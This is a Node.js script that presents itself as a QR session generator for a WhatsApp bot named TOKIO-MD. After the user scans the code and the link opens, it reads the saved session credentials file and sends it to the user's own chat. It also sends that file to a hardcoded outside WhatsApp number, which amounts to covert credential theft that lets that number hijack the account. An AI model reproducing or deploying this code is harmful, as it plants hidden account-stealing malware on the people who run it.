const makeWASocket = require("@adiwajshing/baileys").default
const qrcode = require("qrcode-terminal")
const fs = require('fs')
const pino = require('pino')
const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
const { state, saveState } = useSingleFileAuthState('./session.tokio.json')
const { exec, spawn, execSync } = require("child_process")
exec('rm -rf session.tokio.json')


  function OLDUSER() {
//------------------------------------------------------
    let version = [3,3234,9]
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: ['TOKIO-MD','opera','1.0.0'],
        auth: state,
        version
    })
//------------------------------------------------------
    conn.ev.on("connection.update",async  (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
            await delay(1000 * 10);
  const session = fs.readFileSync("./session.tokio.json");
   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `session.tokio.json` })
	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `session.tokio.json` })
            process.exit(0)
        }
        if (
            connection === "close" &&
            lastDisconnect &&
            lastDisconnect.error &&
            lastDisconnect.error.output.statusCode != 401
        ) {
            OLDUSER()
        }
    })
    conn.ev.on('creds.update', saveState)
    conn.ev.on("messages.upsert",  () => { })
}
OLDUSER()
